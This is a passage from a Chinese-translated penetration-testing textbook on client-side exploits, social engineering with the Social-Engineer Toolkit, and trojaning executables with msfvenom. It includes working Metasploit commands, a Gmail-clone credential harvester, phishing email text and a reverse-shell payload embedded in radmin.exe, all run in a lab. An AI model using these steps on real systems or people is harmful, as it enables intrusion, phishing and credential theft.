  msf  exploit(winamp_maki_bof) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\n\
  msf  exploit(winamp_maki_bof) > exploit\n\n[*] Creating 'mcvcore.maki' file ...\n\
  [+] mcvcore.maki stored at /root/.msf4/local/mcvcore.maki\n```\n\n所示所示选择一个兼容的 Windows\
  \ 负载。一旦生成了恶意 Maki 文件，将其复制到 Apache Web 服务器目录，并设置负载处理器。（设置处理器的示例包含在示例 10-11 中。）现在我们需要以这种方式封装此恶意文件，以便用户被说服在\
  \ Winamp 中加载它。我们可以通过复制 Winamp 自带的一个皮肤来创建一个新的 Winamp 皮肤。我们可以将示例皮肤中的 `mcvcore.maki`\
  \ 文件替换为我们的恶意文件。我们的皮肤实际上看起来什么样并不重要，因为它会导致 Winamp 卡死并在 Metasploit 中向我们发送会话。\n\n在 Windows\
  \ 7 中，从 `C:\\Program Files\\Winamp\\Skins` 复制默认的 Bento Winamp 皮肤文件夹并复制到 Kali。将文件夹\
  \ `Bento` 重命名为 `Rocketship`。将文件 `Rocketship\\scripts\\mcvcore.maki` 替换为刚刚在 Metasploit\
  \ 中创建的恶意文件。将文件夹压缩并复制到 Web 服务器。在下一章中，我们将研究创建可信社会工程活动的方法，但只需说，如果我们能说服用户这个恶意皮肤会让他们的\
  \ Winamp 看起来像火箭一样，我们可能就能说服用户安装它。\n\n切换到 Windows 7，从 Kali Web 服务器下载压缩的皮肤，解压，并将文件夹保存到\
  \ `C:\\Program Files\\Winamp\\Skins`，如图 10-3 所示。\n\n![安装恶意 Winamp 皮肤](img/httpatomoreillycomsourcenostarchimages2030400.png.jpg)图\
  \ 10-3. 安装恶意的 Winamp 皮肤\n\n现在打开 Winamp，转到**Options**选项**▸**Skins**皮肤，并选择**Rocketship**，如图\
  \ 10-4 所示。\n\n一旦你选择了恶意皮肤，Winamp 似乎会关闭，你将在 Metasploit 处理器中接收到一个会话。\n\n![使用恶意皮肤](img/httpatomoreillycomsourcenostarchimages2030402.png.jpg)图\
  \ 10-4. 使用恶意皮肤\n\n## 总结\n\n我们在本章看到的攻击针对的是未在网络端口监听的软件。我们攻击了浏览器、PDF 查看器、Java 浏览器插件以及音乐播放器。我们生成了恶意文件，这些文件在用户打开时会触发客户端软件的漏洞，并且我们查看了请求用户许可运行恶意代码而非依赖未修补漏洞的示例。\n\
  \n对于客户端软件来说，互联网可能是一个可怕的地方。本章讨论的某些漏洞在厂商发布补丁之前已经在野外被目击利用。事实上，我们在 Java 漏洞 中使用的 Java\
  \ 漏洞在 Metasploit 模块添加到框架中时仍然是一个零日漏洞。任何使用 Java 7 的人即使其机器已完全修补，也可能受到恶意网站的侵害，攻击者只需要使用\
  \ Metasploit 就能执行成功的攻击。\n\n当然，如果零日漏洞在互联网上泛滥，禁用或卸载 Java 可以解决这个问题，但对于所有用户和组织来说这可能是不可行的。并不是所有网站都使用\
  \ Java，但像 WebEx 和 GoToMeeting 等流行的在线会议软件需要 Java，而虚拟教室软件 Blackboard 也有相应的 Java 组件。许多网络/安全设备实际上要求网络/安全管理员运行旧版本的\
  \ Java，这使得它们成为客户端攻击的完美目标。大多数读者可能至少能想到一个如果没安装 Java 就会抱怨的网站。\n\n客户端软件对于在任何组织中执行日常任务是必要的，但在评估安全风险时，不应忽视这些软件。保持所有客户端软件更新到最新补丁，在你的个人电脑上这可能是一项艰巨的任务，更不用说在整个组织的计算机上了。即使是那些良好应用了重要\
  \ Windows 安全补丁的组织，也可能错过 Java 或 Adobe Reader 的更新，从而使公司工作站面临受到客户端攻击的风险。\n\n本章中的所有攻击都依赖于合法用户在目标系统上采取行动。虽然我们已经看到用户被诱骗打开恶意文件会发生什么，但我们还没有查看用于让人们打开这些文件的技巧。在下一章中，我们将学习社会工程——即，欺骗用户执行有害操作的方法，例如打开恶意文件、在攻击者拥有的网站上输入凭据或通过电话提供敏感信息。\n\
  \n## 第 11 章. 社会工程\n\n信息安全领域有一句俗话：用户是永远无法修补的漏洞。尽管你部署了所有的安全控制措施，但如果员工被说服交出敏感公司信息，一切都是徒劳的。事实上，许多著名的黑客攻击完全不涉及系统利用。\n\
  \n例如，考虑臭名昭彰的海客 Kevin Mitnick。Mitnick 许多著名的攻击都在于进入建筑，说服安保人员他有权进入那里，然后带走他想要的东西。这种攻击被称为`社会工程`，它利用了人性的漏洞：乐于助人、对安全策略的不了解等等。\n\
  \n社会工程攻击可能涉及复杂的计算要求，也可能完全不需要技术。社会工程师可以在廉商店买一套电工制服，并可能进入一个组织，甚至进入机房。IT 帮助台可能会接到来自老板的老板助理的恐慌电话，对方声称自己锁定了电子邮箱账户。人们通常乐于提供帮助，因此除非有安全的策略执行，否则帮助台工作人员可能会在电话中读出密码或将其设置为默认值，即使拨号者并非他所称的那样。\n\
  \n\n\n\n社交工程攻击的一种常见向量是电子邮件。如果你在工作时感到无聊，可以检查一下你的电子邮件垃圾邮件文件夹。在那些让某些东西变大、某些东西变小的广告中，你会发现人们正拼命想把所有的钱都给你。我深信，如果你能找到那个真的想把财富送给你的非洲王子，那么你因回复钓鱼邮件导致银行账户被黑的那些次都是值得的。开完话不了，试图通过电子邮件或其他电子手段伪装成信任的人来诱骗用户放弃敏感信息被称为\
  \ `phishing attack`（钓鱼攻击）。钓鱼邮件可用于诱导目标访问恶意网站或下载恶意附件等。社交工程攻击是诱骗用户落入我们在第 10 章中研究的客户端攻击所需的缺失要素。\n\
  \n公司应该投入精力培训所有员工了解社交工程攻击。无论你实施了什么种安全技术，员工都必须使用他们的工作站、移动设备等完成工作。他们可能会接触到敏感信息或安全控制，如果落入错误的人手中可能会损害组织。某些安全意识培训可能看起来显而易见，例如“不要与任何人共享密码”以及“在为他人打开安全区域大门之前检查其工牌”。其他的安全意识对许多员工来说可能是新知识。例如，在某些渗透测试项目中，我曾在停车场留过\
  \ USB 盘，或在洗手间地板上贴有“工资”的 DVD 并获得过成功。好奇的用户会开始插入这些设备、打开文件并允许我访问他们的系统。关于恶意文件、USB 切换器和其他攻击的安全意识培训可以帮助防止用户陷入此类社交工程攻击。\n\
  \n## 社交工程工具包 (The Social-Engineer Toolkit)\n\nTrustedSec 的社交工程工具包 (SET) 是一种开源 Python\
  \ 驱动工具，旨在帮助你在渗透测试期间执行社交工程攻击。SET 将帮助你创建各种攻击，例如电子邮件钓鱼活动（旨在使用针对特定的电子邮件窃取凭据、财务信息等）和基于\
  \ Web 的攻击（例如克隆客户网站并骗用户输入登录凭据）。\n\nKali Linux 预装了 SET。要在 Kali Linux 中启动 SET，在提示符处输入\
  \ `setoolkit`，如示例 11-1 所示。我们将使用 SET 运行社交工程攻击，因此在提示符处输入 `1` 进入到社交工程攻击菜单。你将会被提示接受服务条款。\n\
  \n示例 11-1. 启动 SET\n\n```\nroot@kali:~# setoolkit\n--snip--\n Select from the menu:\n\
  \n   1) Social-Engineering Attacks\n   2) Fast-Track Penetration Testing\n   3)\
  \ Third Party Modules\n--snip--\n  99) Exit the Social-Engineer Toolkit\n\nset>\
  \ 1\n```\n\n在本章中，我们将查看我在渗透测试中经常使用的 SET 攻击。我们将从鱼叉式钓鱼攻击开始，这种攻击允许我们通过电子邮件传递攻击。\n\n\
  ## 鱼叉式钓鱼攻击 (Spear-Phishing Attacks)\n\n社交工程攻击菜单提供了我们几种攻击选项，如示例 11-2 所示。我们将创建一个鱼叉式钓鱼攻击，这将允许我们为客户端攻击创建恶意文件（如第\
  \ 10 章中涵盖的内容）、通过电子邮件发送它们，并自动设置 Metasploit 处理器来捕获负载。\n\n示例 11-2. 选择 `Spear-Phishing\
  \ Attack Vectors`\n\n```\nSelect from the menu:\n\n   1) Spear-Phishing Attack Vectors\
  \ ❶\n   2) Website Attack Vectors\n   3) Infectious Media Generator\n   4) Create\
  \ a Payload and Listener\n   5) Mass Mailer Attack\n--snip--\n  99) Return back\
  \ to the main menu.\n\nset> 1\n```\n\n选择选项 `1` 选择 `Spear-Phishing Attack Vectors`\
  \ ❶。鱼叉式钓鱼攻击向量菜单如示例 11-3 所示。\n\n示例 11-3. 选择 `Perform a Mass Email Attack`\n\n```\n\
  \ 1) Perform a Mass Email Attack ❶\n   2) Create a FileFormat Payload ❷\n   3) Create\
  \ a Social-Engineering Template ❸\n--snip--\n  99) Return to Main Menu\n\nset:phishing>\
  \ 1\n```\n\n第一个选项 `Perform a Mass Email Attack` ❶ 允许我们向预定义的电子邮件地址或地址列表发送恶意文件，并为所选的负载设置\
  \ Metasploit 监听器。第二个选项 `Create a FileFormat Payload` ❷ 允许我们创建一个带有 Metasploit 负载的恶意文件。第三个选项允许我们创建一个新的邮件模板\
  \ ❸ 以用于 SET 攻击。\n\n选择选项 `1` 创建电子邮件攻击。（稍后我们将有发送单封邮件或批量邮件的选择。）\n\n### 选择负载 (Choosing\
  \ a Payload)\n\n现在来选择负载（payload）。负载选项的备选列表如示例 11-4 所示。\n\n示例 11-4. 选择鱼叉式钓鱼攻击\n\n\
  ```\n ********** PAYLOADS **********\n\n   1) SET Custom Written DLL Hijacking Attack\
  \ Vector (RAR, ZIP)\n--snip--\n  12) Adobe util.printf() Buffer Overflow ❶\n--snip--\n\
  \  20) MSCOMCTL ActiveX Buffer Overflow (ms12-027)\n\nset:payloads> 12\n```\n\n\
  例如，为了重现第 10 章中的 PDF 攻击，选择选项 `12`：`Adobe util.printf() Buffer Overflow` ❶。（SET 包含了许多\
  \ Metasploit 攻击，以及它自己特定的攻击。）\n\n你应该会被提示为你的恶意文件选择负载（参见示例 11-5）。\n\n示例 11-5. 选择负载\n\
  \n```\n1) Windows Reverse TCP              Spawn a command shell on victim\n   \
  \                                         send back to attacker\n2) Windows Meterpreter_TCP\
  \        Spawn a meterpreter shell on victim\n                                 \
  \           send back to attacker ❶\n\n--snip--\n\nset:payloads> 2\n```\n\n常见的嫌疑都在这里，包括\
  \ `windows/meterpreter/reverse_tcp`，它以更具人类可读的形式显示为 `Windows Meterpreter TCP` ❶。我们将为示例攻击选择此选项。\n\
  \n### 设置选项 (Setting Options)\n\nSET 应该提示输入负载的相关选项，在此例情况下为 `LHOST` 和 `LPORT`。如果你不熟悉\
  \ Metasploit，只需按照提示回答自动设置正确的选项，如示例 11-6 所示。将负载监听器设置为 Kali Linux 的 IP 地址。将连接端口保持为默认（443）。\n\
  \n示例 11-6. 设置选项\n\n```\nset> IP address for the payload listener: 192.168.20.9\n\
  set:payloads> Port to connect back on [443]:\n[-] Defaulting to port 443...\n[-]\
  \ Generating fileformat exploit...\n[*] Payload creation complete.\n[*] All payloads\
  \ get sent to the /usr/share/set/src/program_junk/template.pdf\n[-] 作为额外奖励，使用 SET\
  \ 中的文件格式创建器来创建你的附件。\n```\n\n### 为你的文件命名 (Naming Your File)\n\n接下来你会被提示为你的恶意文件命名。\n\
  \n```\nRight now the attachment will be imported with filename of 'template.whatever'\n\
  \   Do you want to rename the file?\n   example Enter the new filename: moo.pdf\n\
  \    1\\. Keep the filename, I don't care.\n    2\\. Rename the file, I want to\
  \ be cool. ❶\n\nset:phishing> 2\nset:phishing> New filename: bulbsecuritysalaries.pdf\n\
  [*] Filename changed, moving on...\n```\n\n选择选项 `2` ❶ 重命名恶意 PDF，并输入文件名 `bulbsecuritysalaries.pdf`。SET\
  \ 应该继续运行。\n\n\n\n\n\n### 单封或批量邮件\n\n现在要决定让 SET 将我们的恶意文件发送到单个电子邮件地址还是一组地址列表，如 示例\
  \ 11-7 所示。\n\n示例 11-7. 选择执行单邮件地址攻击\n\n```\n Social Engineer Toolkit Mass E-Mailer\n\
  \n   What do you want to do:\n\n   1\\.  E-Mail Attack Single Email Address ❶\n\
  \   2\\.  E-Mail Attack Mass Mailer ❷\n   99\\. Return to main menu.\n\nset:phishing>\
  \ 1\n```\n\n现在先选择单邮件地址选项 ❶。（我们稍将在 批量邮件攻击 中查看如何发送批量邮件 ❷。）\n\n### 创建模板\n\n在编写邮件时，我们可以使用\
  \ SET 的邮件模板之一，或者在模板中输入一次性使用的文本。此外，如果你选择 `Create a Social-Engineering Template`（创建社会工程学模板），你可以创建一个可以重复使用的模板。\n\
  \n我的许多社会工程学客户都喜欢我使用看起来来自公司高管或 IT 经理的虚假邮件，宣布新的网站功能或新的公司政策。让我们用 SET 的一个邮件模板作为示例，现在伪造这封邮件，如\
  \ 示例 11-8 所示；我们将在本章的后半部分创建自己的邮件。\n\n示例 11-8. 选择邮件模板\n\n```\n Do you want to use\
  \ a predefined template or craft a one time email template.\n   1\\. Pre-Defined\
  \ Template\n   2\\. One-Time Use Email Template\n\nset:phishing> 1\n[-] Available\
  \ templates:\n1: Strange internet usage from your computer\n2: Computer Issue\n\
  3: New Update\n4: How long has it been\n5: WOAAAA!!!!!!!!!! This is crazy...\n6:\
  \ Have you seen this?\n7: Dan Brown's Angels & Demons\n8: Order Confirmation\n9:\
  \ Baby Pics\n10: Status Report\nset:phishing> 5\n```\n\n为 `Pre-Defined Template`（预定义模板）选择\
  \ `1`，然后选择模板 `5`。\n\n### 设置目标\n\n现在 SET 应该提示你输入目标电子邮件地址和用于发送攻击邮件的邮件服务器。你可以使用自己的邮件服务器、一个配置错误允许任何人发送邮件的服务器（称为开放中继），或者一个\
  \ Gmail 账户，如 示例 11-9 所示。让我们通过选择选项 `1` 使用 Gmail 进行攻击。\n\n示例 11-9. 使用 SET 发送邮件\n\n\
  ```\nset:phishing> Send email to: georgia@metasploit.com\n\n  1\\. Use a gmail Account\
  \ for your email attack.\n  2\\. Use your own server or open relay\n\nset:phishing>\
  \ 1\nset:phishing> Your gmail email address: georgia@bulbsecurity.com\nset:phishing>\
  \ The FROM NAME user will see: Georgia Weidman\nEmail password:\nset:phishing> Flag\
  \ this message/s as high priority? [yes|no]: no\n[!] Unable to deliver email. Printing\
  \ exceptions message below, this is most likely due to an illegal attachment. If\
  \ using GMAIL they inspect PDFs and is most likely getting caught. ❶\n[*] SET has\
  \ finished delivering the emails\n```\n\n在提示时，输入你 Gmail 账户的电子邮件地址和密码。SET 应该尝试发送消息。但正如你在列表底部的消息所示，Gmail\
  \ 会检查附件并捕获我们的攻击 ❶。\n\n当然，这只是第一次尝试。如果你能收集或猜到凭据，使用你自己的邮件服务器或客户的邮件服务器可能会获得更好的结果。\n\n\
  当然，在这个示例中，我只是在给自己发送邮件。我们在 第 5 章 中查看过 `theHarvester` 等工具来寻找目标的有效电子邮件地址。\n\n### 设置监听器\n\
  \n我们还可以让 SET 设置一个 Metasploit 监听器（listener），以便在有人打开邮件附件时捕获我们的负载（payload）。即使你不熟悉 Metasploit\
  \ 语法，也应该能够根据我们在 设置选项 中选择的选项，使用 SET 来设置这种攻击。你可以看到 SET 使用资源文件根据我们在构建负载时之前的答案自动设置负载、`LHOST`\
  \ 和 `LPORT` 选项（参见 示例 11-10）。\n\n示例 11-10. 设置监听器\n\n```\nset:phishing> Setup a listener\
  \ [yes|no]: yes\nEasy phishing: Set up email templates, landing pages and listeners\n\
  in Metasploit Pro's wizard -- type 'go_pro' to launch it now.\n\n       =[ metasploit\
  \ v4.8.2-2014010101 [core:4.8 api:1.0]\n+ -- --=[ 1246 exploits - 678 auxiliary\
  \ - 198 post\n+ -- --=[ 324 payloads - 32 encoders - 8 nops\n\n[*] Processing src/program_junk/meta_config\
  \ for ERB directives.\nresource (src/program_junk/meta_config)> use exploit/multi/handler\n\
  resource (src/program_junk/meta_config)> set PAYLOAD windows/meterpreter/reverse_tcp\n\
  PAYLOAD => windows/meterpreter/reverse_tcp\nresource (src/program_junk/meta_config)>\
  \ set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nresource (src/program_junk/meta_config)>\
  \ set LPORT 443\nLPORT => 443\n--snip--\nresource (src/program_junk/meta_config)>\
  \ exploit -j\n[*] Exploit running as background job.\nmsf  exploit(handler) >\n\
  [*] Started reverse handler on 192.168.20.9:443\n[*] Starting the payload handler...\n\
  ```\n\n现在我们等待好奇的用户打开我们的恶意 PDF 并向我们发送会话（session）。使用 `ctrl-C` 关闭监听器并输入 `exit` 返回上一个菜单。选项\
  \ 99 将带带回 SET 社会工程学攻击菜单。\n\n## Web 攻击\n\n在本节中，我们将查看基于 Web 的攻击。返回社会工程学攻击菜单（示例 11-2），并选择选项\
  \ `2`（`Website Attack Vectors`）。我在带有社会工程学组件的渗透测试中最常用的攻击类型，因为它模拟了现实中看到的许多社会工程学攻击。\n\
  \n你应该看到一个基于 Web 的攻击列表，如 示例 11-11 所示。\n\n示例 11-11. SET 网站攻击\n\n```\n 1) Java Applet\
  \ Attack Method\n   2) Metasploit Browser Exploit Method\n   3) Credential Harvester\
  \ Attack Method\n   4) Tabnabbing Attack Method\n--snip--\n  99) Return to Main\
  \ Menu\n\nset:webattack> 3\n```\n\n以下是某些攻击的描述：\n\n*   Java Applet 攻击方法自动化了我们在 第\
  \ 10 章 中使用的 Java 签名 applet 攻击。\n\n*   Metasploit 浏览器利用方法允许你通过了解 Metasploit 语法，使用\
  \ Metasploit 所有的浏览器利用客户端攻击，而无需手动设置参数。\n\n*   凭据收集器攻击方法（Credential Harvester Attack\
  \ Method）有助于创建网站以欺骗用户交出凭据。\n\n*   Tabnabbing 攻击方法依赖于用户积累打开浏览器标签页的倾向。当用户第一次打开攻击页面时，会显示“请等待”。自然地，用户在等待时切换回另一个标签页。一旦攻击标签页不再聚焦，它就会加载攻击网站（可以是你喜欢的任何网站的克隆），目标是欺骗用户提供凭据或与恶意网站进行交互。假设用户会使用他们遇到的第一个看起来合法的标签。\n\
  \n选择选项 `3`，即 `Credential Harvester Attack Method`（凭据收集器攻击方法）。\n\n接下来你应该看到一个提示询问想要种种网站。我们可以从一些预构建的\
  \ Web 模板中选择、使用 Site Cloner 从网上克隆网站，或者使用 Custom Import 导入自定义网页。选择选项 `1` 使用 SET 模板（参见\
  \ 示例 11-12）。\n\n\n\n\n\n```\n 1) Web \n   2) 克隆\n   3) 自定义导入\n--snip--\n  99) 返回\
  \ Webattack 菜单\n\nset:webattack> 1\n```\n\n现在输入用于接收回传凭据的网站 IP 地址。我们可以直接使用 Kali 虚拟机的本地\
  \ IP 地址，但如果你对客户端进行此类攻击，则需要一个外网 IP 地址。\n\n```\nIP Address for the POST back in Harvester:\
  \ 192.168.20.9\n```\n\n现在选择一个模板。由于我们想要诱骗用户输入凭据，请选择一个带有登录字段的模板，例如 Gmail（选项 `2`），如\
  \ 示例 11-13 所示。`SET` 现在应该启动一个带有我们伪造 Gmail 页面的 Web 服务器，它是真实 Gmail 页面的克隆。\n\n**示例 11-13.\
  \ 设置网站**\n\n```\n 1\\. 需要 Java\n  2\\. Gmail\n  3\\. Google\n  4\\. Facebook\n \
  \ 5\\. Twitter\n  6\\. Yahoo\n\nset:webattack> Select a template: 2\n\n[*] Cloning\
  \ the website: https://gmail.com\n[*] 这可能需要一点时间...\n使用此攻击的最佳方法是用户名和密码表单字段可用。无论如何，它都会捕获网站上所有的\
  \ POST 请求。\n[*] 社会工程工具包 凭据捕获攻击\n[*] 凭据捕获器正在端口 80 上运行\n[*] 信息将在下方实时显示给您：\n```\n\n\
  现在在 Kali Linux Web 服务器上访问克隆的 Gmail 网站，并输入一些凭据来查看其工作原理。输入凭据后，你应该会被重定向到真实的 Gmail 网站。对于用户来说，这看起来就像他输入的错误的密码。与此同时，回到\
  \ `SET` 中，你应该看到一个类似于 示例 11-14 的结果。\n\n**示例 11-14. SET 捕获凭据**\n\n```\n192.168.20.10\
  \ - - [10/May/2015 12:58:02] \"GET / HTTP/1.1\" 200 -\n[*] 我们抓到了目标！正在打印输出：\nPARAM:\
  \ ltmpl=default\n--snip--\nPARAM: GALX=oXwT1jDgpqg\nPOSSIBLE USERNAME FIELD FOUND:\
  \ Email=georgia❶\nPOSSIBLE PASSWORD FIELD FOUND: Passwd=password❷\n--snip--\nPARAM:\
  \ asts=\n[*] 完成后，按下 CTRL-C 生成报告。\n```\n\n当用户提交页面时，`SET` 会高亮显示它认为感兴趣的字段。在这种情况下，它找到了提交的\
  \ `Email` ❶ 和 `Passwd` ❷。一旦你使用 `ctrl-C` 关闭 Web 服务器以结束 Web 攻击，结果将会被写入文件。\n\n将此方法与接下来讨论的邮件攻击结合使用，这是一个用于在渗透测试中收集凭据的绝佳攻击，或者至少可以测试客户员工的安全意识。\n\
  \n请注意，如果你使用选项 `5`、`Site Cloner`（站点克隆）来制作客户网站的副本，这种攻击会变得更有趣。如果他们没有某种形式的登录表单页面（VPN、网页邮箱、博客等），你甚至可以创建一个。克隆他们的网站，并添加如下简单的\
  \ HTML 表单：\n\n```\n<form name=\"input\" action=\"index.html\" method=\"post\">\n\
  Username: <input type=\"text\" name=\"username\"><br>\nPassword: <input type=\"\
  password\" name=\"pwd\"><br>\n<input type=\"submit\" value=\"Submit\"><br>\n</form>\n\
  ```\n\n然后使用选项 `3`、`Custom Import`（自定义导入）让 `SET` 提供你修改后的页面。\n\n## 批量邮件攻击\n\n现在使用\
  \ `SET` 自动化执行钓鱼邮件攻击。创建一个文件并每行输入几个电子邮件地址，如下所示。\n\n```\nroot@kali:~# cat emails.txt\n\
  georgia@bulbsecurity.com\ngeorgia@grmn00bs.com\ngeorgia@metasploit.com\n```\n\n\
  现在使用选项 99 返回主 `SET` 社会工程攻击菜单（示例 11-15），并选择选项 `5`、`Mass Mailer Attack`（批量邮件攻击）。大型抄送或密抄列表可能会触发垃圾邮件过滤器或提醒用户有异常，手动向长长的客户员工列表发送邮件非常枯燥，因此我们将使用\
  \ `SET` 向多个地址发送邮件（请参见 示例 11-15）。脚本非常适合这类重复性任务。\n\n**示例 11-15. 设置邮件攻击**\n\n```\n\
  set> 5\n\n    1\\.  邮件攻击 单个邮件地址\n    2\\.  邮件攻击 批量发送器\n--snip--\n    99\\. 返回主菜单。\n\
  \nset:mailer> 2\n--snip--\nset:phishing> 导入到 SET 的文件路径: /root/emails.txt❶\n```\n\
  \n选择选项 `2` 并输入要导入的邮件地址文件名 ❶。\n\n接下来我们需要选择一个服务器（请参见 示例 11-16）。让我们再次使用 Gmail——选项 `1`。在出现提示时，输入你的凭据。\n\
  \n**示例 11-16. 登录 Gmail**\n\n```\n1\\. 使用 gmail 账户进行邮件攻击。\n2\\. 使用你自己的服务器或开放的中继\n\
  \nset:phishing> 1\nset:phishing>  gmail 邮箱地址: georgia@bulbsecurity.com\nset:phishing>\
  \ 用户看到的发件人：Georgia Weidman\nEmail password:\nset:phishing> 将此消息/这些消息标记为高优先级？[yes|no]:\
  \ no\n```\n\n你会被要求创建要发送的邮件，如 示例 11-17 所示。\n\n**示例 11-17. 发送邮件**\n\n```\nset:phishing>\
  \ Email subject: Company Portal\nset:phishing> 以 html 还是纯文本发送邮件？'h'\nset:phishing>\
  \ 输入消息正文，输入 END: All\nset:phishing> 正文下一行: 我们正在添加一个新的公司门户。请访问 <a href=\"192.168.20.9\"\
  >http://bulbsecurity.com/webportal</a>a> 并使用你的 Windows 凭据登录。\n正文下一行: Bulb Administrator\n\
  正文下一行: END\n[*] Sent e-mail number: 1 to address: georgia@bulbsecurity.com\n[*]\
  \ Sent e-mail number: 2 to address: georgia@grmn00bs.com\n[*] Sent e-mail number:\
  \ 3 to address: georgia@metasploit.com\n[*] SET 已完成邮件发送\n      按下 <return> 继续\n\
  ```\n\n\n\n\n\n虽然精通安全的用户应该知道不要点击来自非信誉源的邮件中的链接，并且知道在点击之前如何验证链接的去向，但并非所有用户都如此精通，即使是精通的用户也并不总是留神。事实上，我从未发起过任何失败的社会工程测试。\n\
  \n## 多路攻击\n\n让我们把之前的两种攻击（凭据收集和钓鱼邮件）结合起来，欺骗员工将凭据提交到渗透渗透控制的站点。我们将结合电子邮件攻击和网络攻击，通过诱骗用户点击邮件中的链接将其引导到我们控制的站点。\n\
  \n但首先，我们需要更改 SET 配置中的一个选项。在 Kali 中，该文件位于 `/usr/share/set/config/set_config`。要更改的选项是\
  \ `WEB_ATTACK_EMAIL`，它默认设置为 `OFF`。用文本编辑器打开 `config` 文件并将该选项改为 `ON`。\n\n```\n###\
  \ 如果你想结合网络攻击使用电子邮件，请设置为 ON\nWEBATTACK_EMAIL=ON\n```\n\n现在尝试再次运行凭据收集攻击。与其使用模板，如果客户有登录网站（例如网页邮箱或员工门户网站），你可以克隆其一个网页页面。如果客户使用的是网页而非登录网站，请使用\
  \ `Custom Import` 选项来构建你自己的看起来像员工网页的页面，并添加一个登录表单。\n\n## 总结\n\n在本章中，我们只查看了几种可以使用\
  \ SET 自动化的社会工程学攻击。你的攻击脚本将根据客户的需求而变化。某些客户可能有特定的攻击场景设，或者你可能发现需要同时运行多次攻击。例如，你可能会创建一个多路攻击，既收集凭据，又让恶意网站运行恶意的\
  \ Java Applet。除了在这里看到的基于网络的攻击和恶意文件外，SET 还可以创建其他攻击，例如 USB 闪盘、二维码和恶意无线访问点。\n\n## 第\
  \ 12 章：绕过杀毒软件应用程序\n\n你的渗透测试客户极可能正在运行某种杀毒解决方案。到本书为止，我们一直避免让杀毒软件删除我们的任何恶意可执行文件，但规避杀毒程序是一个不断变化的领域。通常，你更有可能通过使用内存损坏漏洞并将载荷直接加载到内存中来规避检测——也就是说永远不接触磁盘。尽管如此，随着攻击格局转向强调客户端和社会工程学攻击，并不总是能够避免将载荷写入磁盘。在本章中，我们将查看几种隐藏我们恶意软件的技术，以尝试在载荷写入磁盘时规避检测。\n\
  \n## 木马\n\n在[第 4 章]中，我们创建了一个运行 Metasploit 载荷的独立恶意可执行文件。虽然我们可能可以使用社会工程学欺骗用户下载并运行我们的恶意文件，但除了我们的可执行文件载荷之外缺乏任何功能，可能会提示用户某些异常。如果我们能将载荷隐藏在某些正常运行的合法程序中，让我们的载荷在后台运行，我们更有可能规避检测。这种程序被称为\
  \ `trojan`（木马），源自结束特洛伊战争的传奇木马。那匹马看起来像是给神的无害礼物，被带进了此前无不可破的特洛伊围城，敌士兵躲在里面随时准备发动攻击。\n\
  \n我们在[第 8 章]中遇到过木马：目标 Ubuntu 上的 Vsftpd 服务器有一个后门，可以通过登录时在用户名中输入笑脸来触发。攻击者破解了 Vsftpd\
  \ 的源码库，并在程序中添加了额外的木马功能。在初始攻破解和检测之间，任何从官方仓库下载 Vsftpd 的人最终都会得到带木马的版本。\n\n### Msfvenom\n\
  \n虽然反向工程二进制文件或获取源码并手动添加木马代码超出了本书的范畴，但 `Msfvenom` 工具具有一些可以使用的选项，可以将 Metasploit 载荷嵌入到合法二进制文件中。[示例\
  \ 12-1] 显示了一些之前在文中未遇到过的重要选项。\n\n示例 12-1. Msfvenom 帮助页面\n\n```\nroot@kali:~# msfvenom\
  \ -h\nUsage: /opt/metasploit/apps/pro/msf3/msfvenom [options] <var=val>\n\nOptions:\n\
  \    -p, --payload    [payload]       要使用的载荷。指定 '-' 或 stdin 以\n                \
  \                      使用自定义载荷\n--snip--\n  ❶-x, --template   [path]           指定一个自定义的可执行文件以\
  \ \n                                       作为模板使用\n  ❷-k, --keep               \
  \         保留模板的行为并将载荷\n                                      作为新线程注入\n--snip--\n\
  ```\n\n特别是，`-x` 标记 ❶ 允许我们使用一个可执行文件作为模板，并在其中嵌入选择的载荷。然而，尽管生成的可执行文件看起来和原始文件一样，但添加的载荷将暂停原始文件的执行，我们不应期望用户多次运行一个启动时似乎卡住的可执行文件。幸运的是，Msfvenom\
  \ 的 `-k` 标记 ❷ 会保持执行模板完整并在新线程中运行我们的载荷，允许原始可执行文件正常运行。\n\n让我们使用 `-x` 和 `-k` 标记构建一个木马\
  \ Windows 可执行文件，它对用户来说是正常的，但在后台向我们发送 Meterpreter 会话。为此，我们使用 `-p` 标记选择载荷，并按照第 4 章所示设置相关的载荷选项。任何合法的可执行文件都可以；你可以在\
  \ Kali Linux 的 `/usr/share/windows-binaries` 找到一些用于渗透的有用 Windows 二进制文件。\n\n要将载荷嵌入\
  \ `radmin.exe` 二进制文件中：\n\n```\nroot@kali:~# msfvenom -p windows/meterpreter/reverse_tcp\
  \ LHOST=192.168.20.9 LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -f\
  \ exe > radmin.exe\n```\n\n我们的 Msfvenom 命令通过 `-p` 选项指定要生成的载荷。我们将 `LHOST` 选项设置为 Kali\
  \ 的 IP 地址，即载荷运行时要回连的系统。我们还可以设置 `LPORT` 选项。正如本节讨论，`-x` 选项选择一个用于嵌入我们载荷的可执行文件。`-k`\
  \ 选项在单独线程中运行载荷。`-f` 标记告诉 Msfvenom 以可执行格式构建载荷。一旦创建，在 Windows XP 或 Windows 7 目标上运行该木马化二进制文件。Radmin\
  \ Viewer 程序应该看起来运行正常（图 12-1），但如果我们使用 `multi/handler` 模块设置了处理器，嵌入的载荷应该为我们提供 Meterpreter\
  \ 会话。\n\n![Trojaned Radmin Viewer executable](img/httpatomoreillycomsourcenostarchimages2030404.png.jpg)图\
  \ 12-1. 木马 Radmin Viewer\n\n通过 MD5 哈希值检查木马\n\n我们的木马二进制文件会让普通用户相信该程序是合法的。精通安全的用户应该在运行文件之前，通过将其\
  \ MD5 哈希值与供应商发布的值（可用）进行对比来验证下载文件的完整性。MD5 哈希是一种文件指纹；如果文件发生了更改，MD5 哈希就会改变。\n\n让我们比较原始\
  \ `radmin.exe` 与我们木马版本的 MD5 哈希值。在 Kali Linux 中，`md5sum` 程序将计算文件的 MD5 哈希。对这两个二进制文件运行\
  \ `md5sum`，你会发现如这里 ❶ 和 ❷ 所示，哈希值差异巨大。\n\n\n\n\n\n```\nroot@kali:~# md5sum /usr/share/windows-binaries/radmin.exe\n\
  ❶2d219cc28a406dbfa86c3301e8b93146  /usr/share/windows-binaries/radmin.exe\n\nroot@kali:~#\
  \ md5sum radmin.exe\n❷4c2711cc06b6fcd300037e3cbdb3293b  radmin.exe\n```\n\n然而，MD5\
